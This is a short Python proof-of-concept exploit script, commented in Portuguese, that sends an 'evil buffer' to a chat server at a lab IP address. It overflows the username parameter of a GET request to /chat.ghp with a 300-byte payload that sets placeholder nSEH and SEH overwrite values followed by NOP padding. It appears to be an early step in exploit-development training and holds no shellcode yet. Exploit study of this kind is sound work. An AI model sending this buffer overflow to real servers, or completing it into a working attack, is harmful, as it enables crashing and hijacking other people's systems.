#!/usr/bin/python
# -*- coding: UTF-8 -*-
# Autor: 1º Ten Chitolina - 0x4rt3mis

import sys
import socket
from struct import pack

host = '192.168.122.49'
port = 80

# Payload de 300
buffer = 300
payload = b"A" * 217 # Offset 221
payload += b"B" * 4 # nSEH
payload += b"C" * 4 # SEH
payload += b"\x90" * (buffer - len(payload))

# Nao alterar
buffer = b"GET /chat.ghp?username=" + payload + b"&password=&room=1&sex=1 HTTP/1.1\r\n"
buffer += b"User-Agent: Mozilla/4.0\r\n"
buffer += b"Host: 192.168.122.49:80\r\n"
buffer += b"Accept-Language: en-us\r\n"
buffer += b"Accept-Encoding: gzip, deflate\r\n"
buffer += b"Referer: http://192.168.122.49\r\n"
buffer += b"Connection: Keep-Alive\r\n\r\n"

print("[*] Sending evil buffer...")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
s.send(buffer)
s.close()
print("[+] Done!")